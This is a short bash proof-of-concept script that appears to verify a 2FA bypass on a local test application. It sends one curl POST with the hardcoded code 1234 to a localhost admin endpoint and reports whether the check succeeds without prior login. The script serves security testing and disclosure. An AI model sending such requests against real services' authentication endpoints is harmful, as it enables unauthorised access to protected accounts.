#!/bin/bash

# POC: 2FA Authentication Bypass
# This demonstrates the 2FA endpoint accepts a hardcoded code without authentication

echo "=== 2FA Authentication Bypass POC ==="
echo ""
echo "Testing: POST /admin/2fa with hardcoded code 1234"
echo ""

RESPONSE=$(curl -s -X POST http://localhost:5003/admin/2fa \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "code=1234")

echo "Response: $RESPONSE"
echo ""

# Extract success status
if echo "$RESPONSE" | grep -q '"success": true'; then
    echo "✓ VULNERABILITY CONFIRMED: 2FA endpoint returns success without authentication"
    echo "✓ The endpoint accepts hardcoded code 1234"
    echo "✓ No prior authentication required"
    exit 0
else
    echo "✗ Unexpected response"
    exit 1
fi
